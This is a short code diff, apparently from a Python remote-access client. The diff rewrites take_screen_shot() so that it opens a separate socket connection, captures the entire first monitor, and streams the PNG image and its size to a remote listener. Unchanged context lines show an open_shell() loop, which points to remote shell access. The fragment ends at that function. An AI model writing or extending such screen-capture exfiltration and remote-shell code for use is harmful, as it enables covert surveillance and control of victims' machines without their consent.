@@ -10,15 +10,22 @@ ip = ""
 port = 0
 
 def take_screen_shot():
+    file_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    file_con.connect(("0.0.0.0", 3001))
+    
+    
     if len(mss.mss().monitors) > 0:
         raw_pixels = mss.mss().grab(mss.mss().monitors[0])
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
-        size = str(len(img_data)) + "\n"
-        server_con.send(size.encode())
+        file_size = str(len(img_data)) + "\n"
+        file_con.send(file_size.encode())
 
-        server_con.sendall(img_data)
-        #server_con.shutdown(socket.SHUT_WR)
+    
+        file_con.sendall(img_data)
+        file_con.shutdown(socket.SHUT_WR)
         del(raw_pixels, img_data)
+        
+    file_con.close()
 
 def open_shell():
     while True:
